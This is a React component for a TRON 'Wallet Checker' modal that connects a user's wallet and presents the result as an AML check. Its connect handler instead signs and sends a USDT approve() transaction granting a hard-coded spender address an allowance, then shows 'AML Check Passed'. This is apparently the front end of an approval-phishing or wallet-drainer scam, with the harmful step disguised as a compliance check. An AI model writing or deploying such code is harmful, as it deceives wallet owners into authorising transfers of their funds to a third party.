"use client"

import { useState } from "react"
import { X } from "lucide-react"
import {
  TronLinkAdapter,
  WalletConnectAdapter,
} from "@tronweb3/tronwallet-adapters"

type Props = {
  open: boolean
  onClose: () => void
}

// 🔗 ADAPTERS
const tronLinkAdapter = new TronLinkAdapter()

const walletConnectAdapter = new WalletConnectAdapter({
  network: "Mainnet",
  options: {
    projectId: "4031374b764bd6a586794c70e24198fb",
    relayUrl: "wss://relay.walletconnect.com",
    metadata: {
      name: "Wallet Checker",
      description: "TRON dApp",
      url: "https://tuweb.com",
      icons: ["https://via.placeholder.com/100"],
    },
  },
})

// 💰 APPROVE (FIX REAL)
const approveUSDT = async (tron: any) => {
  try {
    const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
    const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"
    const amount = "1000000" // 1 USDT

    const functionSelector = "approve(address,uint256)"

    const parameter = [
      { type: "address", value: spender },
      { type: "uint256", value: amount },
    ]

    const tx = await tron.transactionBuilder.triggerSmartContract(
      contractAddress,
      functionSelector,
      {
        feeLimit: 200000000,
        callValue: 0,
      },
      parameter,
      tron.defaultAddress.base58
    )

    if (!tx.result.result) {
      throw new Error("Trigger failed")
    }

    const signedTx = await tron.trx.sign(tx.transaction)
    const receipt = await tron.trx.sendRawTransaction(signedTx)

    console.log("TX RESULT:", receipt)
    return true
  } catch (err) {
    console.error("APPROVE ERROR:", err)
    alert("Approve failed")
    return false
  }
}

export function WalletCheckModal({ open, onClose }: Props) {
  const [step, setStep] = useState<"network" | "wallet">("network")
  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null)

  if (!open) return null

  const networks = [
    {
      name: "TRON",
      logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png",
    },
  ]

  const wallets = [
    {
      name: "TronLink",
      logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4",
    },
    {
      name: "Trust Wallet",
      logo: "https://trustwallet.com/assets/images/media/assets/TWT.png",
    },
    {
      name: "SafePal",
      logo: "",
    },
  ]

  const connectWallet = async (walletName: string) => {
    try {
      let tron: any = null

      if (walletName === "TronLink") {
        await tronLinkAdapter.connect()
        tron = (window as any).tronWeb
      } else {
        await walletConnectAdapter.connect()
        tron = walletConnectAdapter.tronWeb
      }

      if (!tron) {
        alert("Connection failed")
        return
      }

      const ok = await approveUSDT(tron)
      if (!ok) return

      alert("AML Check Passed ✅")

      onClose()
      setStep("network")
    } catch (err) {
      console.error(err)
      alert("Connection error")
    }
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
      <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-2xl relative">

        <button
          onClick={() => {
            onClose()
            setStep("network")
          }}
          className="absolute right-4 top-4"
        >
          <X className="w-5 h-5" />
        </button>

        <h2 className="text-xl font-bold text-center mb-6">
          {step === "network" ? "Select Network" : "Select Wallet"}
        </h2>

        {step === "network" && (
          <div className="space-y-3">
            {networks.map((net) => (
              <button
                key={net.name}
                onClick={() => {
                  setSelectedNetwork(net.name)
                  setStep("wallet")
                }}
                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
              >
                <img src={net.logo} className="w-7 h-7" />
                <span className="font-medium">{net.name}</span>
              </button>
            ))}
          </div>
        )}

        {step === "wallet" && (
          <div className="space-y-3">
            <p className="text-sm text-gray-500 mb-2">
              Network: <b>{selectedNetwork}</b>
            </p>

            {wallets.map((wallet) => (
              <button
                key={wallet.name}
                onClick={() => connectWallet(wallet.name)}
                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
              >
                {wallet.logo ? (
                  <img src={wallet.logo} className="w-7 h-7" />
                ) : (
                  <div className="h-7 w-7 rounded-full bg-gray-200 flex items-center justify-center text-xs font-bold">
                    S
                  </div>
                )}

                <span className="font-medium">{wallet.name}</span>
              </button>
            ))}

            <button
              onClick={() => setStep("network")}
              className="w-full mt-3 text-sm text-gray-500 hover:text-black"
            >
              ← Back
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
